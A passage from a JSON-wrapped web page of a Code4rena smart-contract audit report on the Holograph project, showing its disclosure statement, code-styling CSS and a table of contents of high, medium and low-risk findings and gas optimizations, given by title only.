version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-8\">High Risk Findings (8)</a></p>\n<ul>\n<li><a href=\"#h-01-an-attacker-can-lock-operator-out-of-the-pod-by-setting-gas-limit-thats-higher-than-the-block-gas-limit-of-dest-chain\">[H-01] An attacker can lock operator out of the pod by setting gas limit that’s higher than the block gas limit of dest chain</a></li>\n<li><a href=\"#h-02-if-user-sets-a-low-gasprice-the-operator-would-have-to-choose-between-being-locked-out-of-the-pod-or-executing-the-job-anyway\">[H-02] If user sets a low <code>gasPrice</code> the operator would have to choose between being locked out of the pod or executing the job anyway</a></li>\n<li><a href=\"#h-03--layerzeromodule-miscalculates-gas-risking-loss-of-assets\">[H-03]  LayerZeroModule miscalculates gas, risking loss of assets</a></li>\n<li><a href=\"#h-04-an-attacker-can-manipulate-each-pod-and-gain-an-advantage-over-the-remainder-operators\">[H-04] An attacker can manipulate each pod and gain an advantage over the remainder Operators</a></li>\n<li><a href=\"#h-05-mev-operator-can-bribe-miner-and-steal-honest-operators-bond-amount-if-gas-price-went-high\">[H-05] MEV: Operator can bribe miner and steal honest operator’s bond amount if gas price went high</a></li>\n<li><a href=\"#h-06-gas-price-spikes-cause-the-selected-operator-to-be-vulnerable-to-frontrunning-and-be-slashed\">[H-06] Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed</a></li>\n<li><a href=\"#h-07-failed-job-cant-be-recovered-nft-may-be-lost\">[H-07] Failed job can’t be recovered. NFT may be lost.</a></li>\n<li><a href=\"#h-08-gas-limit-check-is-inaccurate-leading-to-an-operator-being-able-to-fail-a-job-intentionally\">[H-08] Gas limit check is inaccurate, leading to an operator being able to fail a job intentionally</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-19\">Medium Risk Findings (19)</a></p>\n<ul>\n<li><a href=\"#m-01-isowner--onlyowner-checks-can-be-bypassed-by-attacker-in-erc721erc20-implementations\">[M-01] <code>isOwner</code> / <code>onlyOwner</code> checks can be bypassed by attacker in ERC721/ERC20 implementations</a></li>\n<li><a href=\"#m-02-_payouttokens-is-not-compatible-with-tokens-with-missing-return-value\">[M-02] <code>_payoutToken[s]()</code> is not compatible with tokens with missing return value</a></li>\n<li><a href=\"#m-03-beaming-job-might-freeze-on-dest-chain-under-some-conditions-leading-to-owner-losing-temporarily-access-to-token\">[M-03] Beaming job might freeze on dest chain under some conditions, leading to owner losing (temporarily) access to token</a></li>\n<li><a href=\"#m-04-incorrect-implementation-of-erc721-may-have-bad-consequences-for-receiver\">[M-04] Incorrect implementation of ERC721 may have bad consequences for receiver</a></li>\n<li><a href=\"#m-05-it-is-possible-that-operator-loses-sent-eth-after-calling-holographoperator-contracts-executejob-function\">[M-05] It is possible that operator loses sent ETH after calling <code>HolographOperator</code> contract’s <code>executeJob</code> function</a></li>\n<li><a href=\"#m-06-bad-source-of-randomness\">[M-06] Bad source of randomness</a></li>\n<li><a href=\"#m-07--attacker-can-force-chaotic-operator-behavior\">[M-07]  Attacker can force chaotic operator behavior</a></li>\n<li><a href=\"#m-08-_payouteth-calculates-balance-with-an-offset-always-leaving-dust-eth-in-the-contract\">[M-08] <code>_payoutEth()</code> calculates <code>balance</code> with an offset, always leaving dust <code>ETH</code> in the contract</a></li>\n<li><a href=\"#m-09-holographerc20-breaks-composability-by-forcing-usage-of-draft-proposal-eip-4524\">[M-09] <code>HolographERC20</code> breaks composability by forcing usage of draft proposal EIP-4524</a></li>\n<li><a href=\"#m-10-holographable-tokens-can-be-reinitialized\">[M-10] Holographable tokens can be reinitialized</a></li>\n<li><a href=\"#m-11-source-contract-can-steal-nfts-from-users\">[M-11] Source contract can steal NFTs from users</a></li>\n<li><a href=\"#m-12-bond-tokens-hlg-can-get-permanently-stuck-in-operator\">[M-12] Bond tokens (HLG) can get permanently stuck in operator</a></li>\n<li><a href=\"#m-13-implementation-code-does-not-align-with-the-business-requirement-users-are-not-charged-with-withdrawn-fee-when-user-unbound-token-in-holographoperatorsol\">[M-13] Implementation code does not align with the business requirement: Users are not charged with withdrawn fee when user unbound token in <code>HolographOperator.sol</code></a></li>\n<li><a href=\"#m-14-pa1dbidsharesfortoken-returns-incorrect-bidsharescreatorvalue\">[M-14] PA1D#bidSharesForToken returns incorrect <code>bidShares.creator.value</code></a></li>\n<li><a href=\"#m-15-holographerc721safetransferfrom-not-compliant-with-eip-721\">[M-15] <code>HolographERC721.safeTransferFrom</code> not compliant with EIP-721</a></li>\n<li><a href=\"#m-16-approvalall-event-is-missing-parameters\">[M-16] <code>ApprovalAll</code> event is missing parameters</a></li>\n<li><a href=\"#m-17-wrong-slashing-calculation-rewards-for-operator-that-did-not-do-his-job\">[M-17] Wrong slashing calculation rewards for operator that did not do his job</a></li>\n<li><a href=\"#m-18-leak-of-value-when-interacting-with-an-erc721-enforcer-contract\">[M-18] Leak of value when interacting with an ERC721 enforcer contract</a></li>\n<li><a href=\"#m-19-holographerc721approve-not-eip-721-compliant\">[M-19] <code>HolographERC721.approve</code> not EIP-721 compliant</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#01-missing-checks-for-address0x0\">01 Missing Checks for Address(0x0)</a></li>\n<li><a href=\"#02-use-safetransfer-instead-of-transfer\">02 Use <code>safetransfer</code> Instead Of <code>transfer</code></a></li>\n<li><a href=\"#03-unused-receive-function-will-lock-ether-in-contract\">03 Unused <code>receive()</code> Function Will Lock Ether In Contract</a></li>\n<li><a href=\"#04-use-_safemint-instead-of-_mint\">04 Use <code>_safeMint</code> instead of <code>_mint</code></a></li>\n<li><a href=\"#05-missing-contract-existence-checks-before-low-level-calls\">05 Missing Contract-existence Checks Before Low-level Calls</a></li>\n<li><a href=\"#06-critical-changes-should-use-two-step-procedure\">06 Critical Changes Should Use Two-step Procedure</a></li>\n<li><a href=\"#07-low-level-calls-with-solidity-version-0814-can-result-in-optimiser-bug\">07 Low Level Calls With Solidity Version 0.8.14 Can Result In Optimiser Bug</a></li>\n<li><a href=\"#08-usage-of-payabletransfer-can-lead-to-loss-of-funds\">08 Usage of <code>payable.transfer</code> can lead to loss of funds</a></li>\n<li><a href=\"#09-ecrecover-may-return-empty-address\">09 <code>ecrecover</code> may return empty address</a></li>\n<li><a href=\"#10-holographfactorydeployholographablecontract-can-overpopulate-holographregistry_holographablecontracts\">10 <code>HolographFactory.deployHolographableContract()</code> can overpopulate <code>HolographRegistry._holographableContracts</code></a></li>\n<li><a href=\"#11-event-is-missing-indexed-fields\">11 Event Is Missing Indexed Fields</a></li>\n<li><a href=\"#12-public-functions-not-called-by-the-contract-should-be-declared-external-instead\">12 Public Functions Not Called By The Contract Should Be Declared External Instead</a></li>\n<li><a href=\"#13-constants-should-be-defined-rather-than-using-magic-numbers\">13 Constants Should Be Defined Rather Than Using Magic Numbers</a></li>\n<li><a href=\"#14-missing-event-for-critical-parameter-change\">14 Missing event for critical parameter change</a></li>\n<li><a href=\"#15-require--revert-statements-should-have-descriptive-reason-strings\">15 <code>require()</code> / <code>revert()</code> Statements Should Have Descriptive Reason Strings</a></li>\n<li><a href=\"#16-implementation-contract-may-not-be-initialized\">16 Implementation contract may not be initialized</a></li>\n<li><a href=\"#17-large-multiples-of-ten-should-use-scientific-notation\">17] Large multiples of ten should use scientific notation</a></li>\n<li><a href=\"#18-use-of-blocktimestamp\">18 Use of Block.Timestamp</a></li>\n<li><a href=\"#19-non-usage-of-specific-imports\">19 Non-usage of specific imports</a></li>\n<li><a href=\"#20-lines-are-too-long\">20 Lines are too long</a></li>\n<li><a href=\"#21-use-bytesconcat\">21 Use <code>bytes.concat()</code></a></li>\n<li><a href=\"#22-use-of-ecrecover-is-susceptible-to-signature-malleability\">22 Use of <code>ecrecover</code> is susceptible to signature malleability</a></li>\n<li><a href=\"#23-commented-code\">23 Commented code</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#g-01-dont-initialize-variables-with-default-value\">G-01 Don’t Initialize Variables with Default Value</a></li>\n<li><a href=\"#g-02-cache-array-length-outside-of-loop\">G-02 Cache Array Length Outside of Loop</a></li>\n<li><a href=\"#g-03-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\">G-03 Using > 0 costs more gas than != 0 when used on a uint in a require() statement</a></li>\n<li><a href=\"#g-04-long-revert-strings\">G-04 Long Revert Strings</a></li>\n<li><a href=\"#g-05-use-calldata-instead-of-memory\">G-05 Use calldata instead of memory</a></li>\n<li><a href=\"#g-06-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G-06 Functions guaranteed to revert when called by normal users can be marked payable</a></li>\n<li><a href=\"#g-07-empty-blocks-should-be-removed-or-emit-something\">G-07 Empty blocks should be removed or emit something</a></li>\n<li><a href=\"#g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\">G-08 Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead</a></li>\n<li><a href=\"#g-09-using-bools-for-storage-incurs-overhead\">G-09 Using bools for storage incurs overhead</a></li>\n<li><a href=\"#g-10-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-for-example-when-used-in-for--and-while-loops\">G-10 ++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, for example when used in for- and while-loops</a></li>\n<li><a href=\"#g-11-x--y-costs-more-gas-than-x--x--y-for-state-variables\">G-11 <x> += <y> costs more gas than <x> = <x> + <y> for state variables</a></li>\n<li><a href=\"#g-12-abiencode-is-less-efficient-than-abiencodepacked\">G-12 abi.encode() is less efficient than abi.encodePacked()</a></li>\n<li><a href=\"#g-13-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G-13 Use custom errors rather than revert()/require() strings to save gas</a></li>\n<li><a href=\"#g-14-prefix-increments-cheaper-than-postfix-increments\">G-14 Prefix increments cheaper than Postfix increments</a></li>\n<li><a href=\"#g-15-use-bytes32-instead-of-string\">G-15 Use bytes32 instead of string</a></li>\n<li><a href=\"#g-16-splitting-require-statements-that-use--saves-gas\">G-16 Splitting require() statements that use &#x26;&#x26; saves gas</a></li>\n<li><a href=\"#g-17-public-functions-not-called-by-the-contract-should-be-declared-external-instead\">G-17 Public functions not called by the contract should be declared external instead</a></li>\n<li><a href=\"#g-18-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas\">G-18 Not using the named return variables when a function returns, wastes deployment gas</a></li>\n<li><a href=\"#g-19-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\">G-19 Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</a></li>\n<li><a href=\"#g-20-use-assembly-to-check-for-address0\">G-20 Use assembly to check for address(0)</a></li>\n<li><a href=\"#g-21-use-selfbalance\">G-21 Use selfbalance()</a></li>\n<li><a href=\"#g-22-using-storage-instead-of-memory-for-structsarrays-saves-gas\">G-22 Using storage instead of memory for structs/arrays saves gas</a></li>\n<li><a href=\"#g-23-internal-functions-only-called-once-can-be-inlined-to-save-gas\">G-23 internal functions only called once can be inlined to save gas</a></li>\n<li><a href=\"#g-25-internal-functions-not-called-by-the-contract-should-be-removed-to-save-deployment-gas\">G-25 internal functions not called by the contract should be removed to save deployment gas</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}